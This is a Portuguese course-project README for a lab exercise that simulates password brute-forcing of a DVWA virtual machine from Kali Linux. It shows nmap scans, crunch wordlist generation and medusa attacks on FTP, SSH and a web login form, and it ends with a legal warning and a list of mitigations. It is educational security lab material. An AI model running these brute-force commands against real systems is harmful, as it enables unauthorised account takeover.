# desafio-seguranca

Repositório entregue como projeto prático do curso: **Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux**.

> **Aviso legal:** Todas as ações descritas neste repositório devem ser executadas **apenas em ambiente controlado e com autorização explícita** (laboratório, máquinas virtuais ou sistemas de teste). Uso em sistemas sem permissão é ilegal e antiético.

## Estrutura do repositório
- `README.md` - este arquivo.
- `report/` - relatório com os passos executados e resultados (prints, comandos e observações).
- `scripts/` - scripts automatizados (varredura Nmap, geração de wordlist, execução do Medusa).
- `wordlists/` - wordlists geradas ou usadas (exemplo pequeno para testes).
- `images/` - capturas de tela organizadas (opcional).

---

## Objetivo
Demonstrar em um ambiente de laboratório (DVWA + Kali Linux) as etapas de reconhecimento e execução de um ataque de força bruta contra um serviço de autenticação web/FTP/SSH usando ferramentas como `nmap`, `crunch` e `medusa` (exposição controlada apenas para fins educativos).

## Ambiente usado (sugestão)
- Kali Linux (máquina atacante)
- DVWA em uma VM separada (máquina alvo)
- Rede isolada (NAT interno ou host-only)
- Ferramentas: `nmap`, `medusa`, `crunch`, `hydra` (opcional), `john` (opcional)

## Passos realizados (resumo)
1. Varredura de portas e serviços com `nmap` para identificar serviços autenticáveis.
2. Enumeração de versões de serviços e detecção de pontos de entrada.
3. Geração de wordlist personalizada com `crunch` (focada em padrões do alvo).
4. Execução de ataque de força bruta com `medusa` (ou `hydra`) contra o serviço identificado.
5. Registro de evidências (prints, saída dos comandos e relatórios).
6. Recomendações de mitigação e defesa.

---

## Comandos principais (exemplos)

### 1) Varredura rápida de portas e versão
```bash
# varredura TCP top 1000 portas + detecção de versão e scripts básicos
nmap -sV -sC -p- --min-rate=1000 -oN report/nmap_full_tcp.txt 10.0.2.15
```

### 2) Varredura específica de serviços (HTTP / FTP / SSH)
```bash
nmap -p 22,21,80,443 -sV -oN report/nmap_services.txt 10.0.2.15
```

### 3) Geração de wordlist com crunch (exemplo simples)
```bash
# exemplo: gerar senhas de 6 a 8 caracteres usando letras e números
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlists/custom_small.txt
```

### 4) Uso do medusa para brute force (HTTP form / FTP / SSH)
```bash
# exemplo para FTP (usuário ftpuser)
medusa -h 10.0.2.15 -u ftpuser -P wordlists/custom_small.txt -M ftp -n 21 -f

# exemplo para SSH
medusa -h 10.0.2.15 -u root -P wordlists/custom_small.txt -M ssh -f

# exemplo para web form (usar módulo http_form)
medusa -h 10.0.2.15 -u admin -P wordlists/custom_small.txt -M http_form:LOGIN:username:password:POST:/dvwa/login.php
```

> **Obs:** os parâmetros do módulo `http_form` dependem do formulário alvo — é necessário inspecionar o HTML e ajustar os campos.

---

## Mitigações e recomendações rápidas
- Implementar bloqueio por tentativas (rate-limiting, fail2ban).
- Exigir senhas fortes (comprimento mínimo, complexidade).
- Habilitar autenticação multifator (MFA) onde possível.
- Revisar logs e configurar alertas para múltiplas tentativas de autenticação.
- Atualizar serviços e corrigir vulnerabilidades conhecidas.

---

## Como usar este repositório
1. Baixe o `.zip` fornecido (ou clone o repo localmente).
2. Abra a pasta `scripts/` e ajuste variáveis (IP alvo, usuário, wordlist).
3. Execute em ambiente isolado com permissão.

---

## Referências
- Kali Linux documentation
- Medusa manual / `man medusa`
- Crunch documentation
- Nmap book (man nmap)

---
